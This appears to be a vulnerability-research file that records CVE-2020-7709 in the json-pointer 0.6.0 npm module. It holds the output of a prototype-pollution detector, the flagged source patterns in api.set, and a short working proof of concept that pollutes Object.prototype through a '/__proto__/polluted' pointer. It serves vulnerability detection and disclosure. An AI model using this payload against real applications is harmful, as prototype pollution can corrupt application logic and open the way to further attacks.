// Module Name : json-pointer
// Version : 0.6.0
// CVE number : CVE-2020-7709
// CVSS score : 6.0 (CVSS 3.0)
// Published Date : 05 Oct, 2020

/* DAPP analysis result
[+] FileSize(Bytes) : 9243
[+] Total Time(ms) : 3705
[+] Analysis Time(ms) : 189
[+] Detected AST Pattern 1 : 2
[+] Detected AST Pattern 2 : 2
SCC generation complete
 
**********Prototype Pollution v2 found!**********
[ 5963, 5978 ] obj = obj [ tok ]
[ 6072, 6093 ] obj [ nextTok ]= value
*/

// Prototype pollution source code patterns detected
/*
api.set = function set (obj, pointer, value) {
	...
	obj = obj[tok]          //AST Pattern 1
	...
	obj[nextTok] = value    //AST Pattern 2
	...
}
*/

// POC of CVE-2020-7709
const jsonpointer = require('json-pointer')
jsonpointer.set({}, '/__proto__/polluted', true)
console.log(polluted) //true